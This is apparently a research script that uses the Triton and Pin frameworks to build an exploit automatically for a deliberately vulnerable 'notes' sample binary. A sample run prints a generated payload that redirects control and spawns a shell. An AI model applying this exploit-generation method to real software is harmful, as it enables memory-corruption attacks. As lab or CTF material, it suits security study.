#!/usr/bin/env python2
## -*- coding: utf-8 -*-

_ = """
export CRASHED_AT='0x00007ffff7a8c231'  ### value is just example
time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes-phase-2.py vuln-samples/notes < crash_inputs
"""

import os
from triton  import *
from pintool import *
import time

isRead = None
Triton = getTritonContext()
stdin_len = 0
crash_inputs = []
found = False

instant_win = 0x4008b2

def solve():
    global Triton
    global crash_inputs
    global found

    found = False
    inputs = ['\0'] * 1024
    astCtxt = Triton.getAstContext()

    try:
        m = Triton.getModel(
                astCtxt.equal(
                    Triton.buildSymbolicMemory(MemoryAccess(0x602060 + 3 * 8, CPUSIZE.QWORD)),
                    astCtxt.bv(instant_win, CPUSIZE.QWORD_BIT)
                ),
            )
        if len(m) > 0:
            found = True
            PAYLOAD_FILE = 'exploit-payload'
            print '~' * 8
            print '[TT] Automated Exploit Generation Done. Saving payload as \'{}\''.format(PAYLOAD_FILE)

            print '[TT] Model for Memory Access:', m
            for k, v in m.items():
                inputs[k] = chr(v.getValue())
                crash_inputs[k] = chr(v.getValue())
                Triton.setConcreteSymbolicVariableValue(Triton.getSymbolicVariableFromId(k), v.getValue()) # update concate memory
            print 'Crash Inputs: %r' % ''.join(crash_inputs)
            with open(PAYLOAD_FILE, 'wb') as f:
                f.write(''.join(crash_inputs))
            print 'To test payload: `(cat {} -) | ./vuln-samples/notes`'.format(PAYLOAD_FILE)
        else:
            print '[TT] Model for Memory Access: unsat'

        if found:
            return True
        return False
    except Exception, e:
        print "Exception: ", e
        exit()


def syscallsEntry(threadId, std):
    global isOpen
    global isRead
    global targetFd

    if getSyscallNumber(std) == SYSCALL64.READ:
        fd   = getSyscallArgument(std, 0)
        buff = getSyscallArgument(std, 1)
        size = getSyscallArgument(std, 2)
        if fd == 0:
            isRead = {'buff': buff, 'size': size}

    return

def syscallsExit(threadId, std):
    global isOpen
    global isRead
    global targetFd
    global stdin_len
    global concrete_input_offets

    ctxt = getTritonContext()

    if isRead is not None:
        size = isRead['size']
        buff = isRead['buff']
        print '\n[TT] Symbolizing stdin (buf=%#x, size=%d)' % (buff, size)
        for index in range(size):
            print '\tread: %r (%#x)' % (chr(getCurrentMemoryValue(buff+index)), getCurrentMemoryValue(buff+index))

            start_time = time.time()
            ### Symbolize input
            ctxt.setConcreteMemoryValue(buff+index, getCurrentMemoryValue(buff+index))
            print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
            ### concretize part of stdin
            if stdin_len in concrete_input_offets:
                print "\tConcretized stdin pos %d" % stdin_len
                ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
            end_time = time.time()
            print 'symbolize took %f sec' % (end_time - start_time)

            stdin_len += 1
        isRead = None

    return

def mycb(inst):
    global stdin_len
    global crash_inputs
    global crashed_at

    if inst.getAddress() == instant_win:
        print '[TT] $PC reached to target address!!'
        exit()
    if (inst.getAddress() & 0xfff) == (crashed_at & 0xfff):
        if stdin_len + 1 >= len(crash_inputs): ### end of file
            if inst.isMemoryWrite() and inst.isSymbolized():
                found = solve()
                if found:
                    print "[TT] End"
                    exit()
    return

def signals(threadId, sig):
    print 'Signal %d received on thread %d.' % (sig, threadId)
    # print '========================== DUMP =========================='
    # regs = getTritonContext().getParentRegisters()
    # for reg in regs:
    #     value  = getCurrentRegisterValue(reg)
    #     exprId = getTritonContext().getSymbolicRegisterId(reg)
    #     print '%s:\t%#016x\t%s' %(reg.getName(), value, (getTritonContext().getSymbolicExpressionFromId(exprId).getAst() if exprId != SYMEXPR.UNSET else 'UNSET'))
    # solve()


if __name__ == '__main__':

    # Define symbolic optimizations
    Triton.enableMode(MODE.ALIGNED_MEMORY, True) ### **REQUIRED** (slowns, but nor leaAst becomes bvtrue)
    Triton.enableMode(MODE.ONLY_ON_SYMBOLIZED, True) ### **REQUIRED**

    startAnalysisFromSymbol('main')

    ### Enforce concrete execution on partial of stdin
    # concrete_input_offets = range(66)
    concrete_input_offets = range(0)

    ### Set the address where crash occurs
    if 'CRASHED_AT' in os.environ:
        crashed_at = int(os.environ['CRASHED_AT'], 16)
    else:
        print '[TT] set value to environment variable \'CRASHED_AT\' which is the address where the crash occurs'
        exit()

    with open('crash_inputs') as f:
        crash_inputs = list(f.read())

    ### Add callback
    insertCall(mycb, INSERT_POINT.BEFORE)
    insertCall(signals, INSERT_POINT.SIGNALS) # wait for SIGSEGV

    insertCall(syscallsEntry, INSERT_POINT.SYSCALL_ENTRY)
    insertCall(syscallsExit,  INSERT_POINT.SYSCALL_EXIT)

    ### Run Program
    runProgram()


"""
concrete_input_offets = range(66)
-----
[TT] Automated Exploit Generation Done. Saving as 'exploit-payload'
[TT] Model for Memory Access: {67L: SymVar_67 = 0xB2, 68L: SymVar_68 = 0x8, 69L: SymVar_69 = 0x40, 70L: SymVar_70 = 0x0, 71L: SymVar_71 = 0x0, 72L: SymVar_72 = 0x0, 73L: SymVar_73 = 0x0, 74L: SymVar_74 = 0x0}
Crash Inputs: 'n\ntit\ncon\nn\ntit!\ncon!\nu\n1\nAAA%AAsAABAA$AAnx `\x00\x00\x00\x00\x00\ncon!!\nu\n2\ntit!!\n\xb2\x08@\x00\x00\x00\x00\x00sh\n'
To test payload: `(cat exploit-payload -) | ./vuln-samples/notes`
[TT] End
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  20.14s user 2.09s system 99% cpu 22.270 total
-----
"""